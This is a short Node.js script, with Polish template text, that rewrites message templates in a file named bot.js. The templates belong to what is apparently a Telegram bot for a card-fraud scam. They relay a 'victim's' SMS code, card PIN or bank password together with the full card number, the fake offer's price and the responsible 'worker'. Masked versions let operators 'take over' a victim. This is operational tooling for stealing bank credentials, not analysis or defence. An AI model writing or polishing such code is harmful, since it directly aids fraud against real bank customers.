const fs = require("fs");
const p = "bot.js";
let c = fs.readFileSync(p, "utf8");
function rep(from, to) {
	const before = c;
	c = c.split(from).join(to);
	console.log(before === c ? "BRAK" : "ok", JSON.stringify(from.slice(0, 50)));
}

// SMS
rep(
	'fullText: `✉️ <b>Victim podał kod SMS</b>\\n\\n` +\n\t\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n\\n` +\n\t\t\t\t`📃 <b>KOD:</b> <code>${smsCode}</code>\\n` +\n\t\t\t\t`💳 <b>KARTA:</b> <code>${cardNumber}</code>\\n\\n` +\n\t\t\t\t`👷 <b>Worker:</b> @${workerName}`,\n\t\t\tmaskedText: `✉️ <b>Kod SMS od victima</b>\\n\\n` +\n\t\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n` +\n\t\t\t\t`📃 <b>KOD:</b> <code>••• •••</code>\\n` +\n\t\t\t\t`💳 <b>KARTA:</b> <code>${maskCardNumber(cardNumber)}</code>\\n\\n` +\n\t\t\t\t`🔒 <b>Dane ukryte</b> — przejmij, aby zobaczyć`',
	'fullText: `✉️ <b>Kod SMS od victima</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN\\n✉️ <b>Kod SMS</b> · <code>${smsCode}</code>\\n💳 <b>Karta</b> · <code>${cardNumber}</code></blockquote>\\n👷 ${workerName}`,\n\t\t\tmaskedText: `✉️ <b>Kod SMS od victima</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN\\n✉️ <b>Kod SMS</b> · <code>••• •••</code>\\n💳 <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code></blockquote>\\n🔒 Dane ukryte — przejmij, aby zobaczyć`'
);

// PIN
rep(
	'fullText: `💳 <b>Victim podał kod PIN</b>\\n\\n` +\n\t\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n\\n` +\n\t\t\t\t`📃 <b>PIN:</b> <code>${smsCode}</code>\\n` +\n\t\t\t\t`💳 <b>KARTA:</b> <code>${cardNumber}</code>\\n\\n` +\n\t\t\t\t`👷 <b>Worker:</b> @${workerName}`,\n\t\t\tmaskedText: `💳 <b>PIN od victima</b>\\n\\n` +\n\t\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n` +\n\t\t\t\t`📃 <b>PIN:</b> <code>••••</code>\\n` +\n\t\t\t\t`💳 <b>KARTA:</b> <code>${maskCardNumber(cardNumber)}</code>\\n\\n` +\n\t\t\t\t`🔒 <b>Dane ukryte</b> — przejmij, aby zobaczyć`',
	'fullText: `📟 <b>PIN od victima</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN\\n📟 <b>PIN</b> · <code>${smsCode}</code>\\n💳 <b>Karta</b> · <code>${cardNumber}</code></blockquote>\\n👷 ${workerName}`,\n\t\t\tmaskedText: `📟 <b>PIN od victima</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN\\n📟 <b>PIN</b> · <code>••••</code>\\n💳 <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code></blockquote>\\n🔒 Dane ukryte — przejmij, aby zobaczyć`'
);

// Hasło
rep(
	'fullText: `🔐 <b>Victim podał hasło do banku</b>\\n\\n` +\n\t\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n\\n` +\n\t\t\t\t`📃 <b>Hasło:</b> <code>${smsCode}</code>\\n` +\n\t\t\t\t`💳 <b>KARTA:</b> <code>${cardNumber}</code>\\n\\n` +\n\t\t\t\t`👷 <b>Worker:</b> @${workerName}`,\n\t\t\tmaskedText: `🔐 <b>Hasło od victima</b>\\n\\n` +\n\t\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n` +\n\t\t\t\t`📃 <b>Hasło:</b> <code>••••••</code>\\n` +\n\t\t\t\t`💳 <b>KARTA:</b> <code>${maskCardNumber(cardNumber)}</code>\\n\\n` +\n\t\t\t\t`🔒 <b>Dane ukryte</b> — przejmij, aby zobaczyć`',
	'fullText: `🔐 <b>Hasło od victima</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN\\n🔐 <b>Hasło</b> · <code>${smsCode}</code>\\n💳 <b>Karta</b> · <code>${cardNumber}</code></blockquote>\\n👷 ${workerName}`,\n\t\t\tmaskedText: `🔐 <b>Hasło od victima</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN\\n🔐 <b>Hasło</b> · <code>••••••</code>\\n💳 <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code></blockquote>\\n🔒 Dane ukryte — przejmij, aby zobaczyć`'
);

fs.writeFileSync(p, c);
